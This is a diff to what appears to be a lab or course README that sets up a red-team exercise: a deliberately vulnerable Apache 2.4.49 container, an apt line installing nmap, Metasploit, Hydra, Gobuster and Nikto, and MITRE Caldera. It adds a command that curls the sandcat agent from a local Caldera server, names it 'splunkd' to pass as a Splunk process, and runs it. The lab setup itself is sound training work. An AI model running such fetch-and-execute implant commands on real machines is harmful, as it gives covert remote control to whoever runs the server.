@@ -33,4 +33,19 @@ EXPOSE 80
 CMD ["/usr/local/apache2/bin/httpd", "-D", "FOREGROUND"])
 - after saving the file we need to build the image the containers will be using with the following command 'sudo docker build -t apache-2.4.49'
 - -then use 'sudo docker run -d -p 8080:80 apache-2.4.49' to make the container with apache running on port 8080
-  
+# 3-Attack Tools:
+we needed to install some tools that we might use for attacks and we used the following command
+
+-sudo apt install nmap metasploit-framework hydra gobuster nikto -y
+# 4-Caldera:
+Caldera is a necessary part to complete the project so we followed these commands to install it correctly and making sure it runs without errors.
+
+-git clone https://github.com/mitre/caldera.git --recursive
+-pip3 install -r requirements.txt
+-python3 server.py --insecure –build (use --build if it is running for the first time, after the first time you can remove it and it will run okay).
+- to be able to run operations in caldera we need an agent the following code we used to make an agent (server 'http: //192. 168.112.129:8888' ;
+curl-s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download › splunkd;
+chmod +x splunkd;
+./splunkd -server $server -group red -v)
+
+
